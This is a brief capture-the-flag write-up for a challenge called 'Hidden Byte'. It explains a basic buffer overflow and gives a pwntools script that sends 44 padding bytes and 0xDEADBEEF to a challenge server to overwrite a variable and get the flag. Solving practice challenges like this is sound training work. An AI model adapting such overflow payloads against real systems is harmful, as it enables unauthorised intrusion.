# Hidden Byte

This is a simple buffer overflow. The binary has a 44 character buffer, and the next variable needs to be overwritten with `0xDEADBEEF` to return the flag.

```py
from pwn import *

io = remote('chal.tuctf.com', 30012)

io.send(b'a'*44)
io.pack(0xDEADBEEF)

io.interactive()
```